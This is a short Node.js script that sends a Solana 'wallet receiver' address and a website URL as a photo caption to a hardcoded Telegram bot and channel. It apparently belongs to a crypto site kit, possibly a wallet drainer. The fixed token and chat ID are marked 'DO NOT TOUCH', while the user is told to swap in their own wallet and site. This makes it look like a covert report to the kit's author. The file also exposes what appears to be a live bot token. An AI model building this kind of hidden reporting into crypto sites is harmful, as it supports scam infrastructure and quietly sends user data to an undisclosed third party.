const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '7520075192:AAEkcBfRcBdfWvnS1qouENDpljroGyTkKSo';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '7253475769';

async function sendPhotoWithCaption(photoUrl, solana_wallet_receiver_id, website_url) {
    try {
        const caption = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendPhoto`,
            {
                chat_id: chatId,
                photo: photoUrl,
                caption: caption
            }
        );
        console.log('Photo sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending photo to Telegram:', error);
    }
}


// Change this information for yours (
const solana_wallet_receiver_id = 'DSj8cEN1Bd9CxFrrgNMuwcTnqtfJ4JKFakLeFnjDYNvR';
const website_url = 'https://solana-jade.vercel.app/';
const icon_url = 'https://digiseller.mycdn.ink/preview/1078014/p1_4530876_67bf7cf4.png'; // URL иконки

sendPhotoWithCaption(icon_url, solana_wallet_receiver_id, website_url);
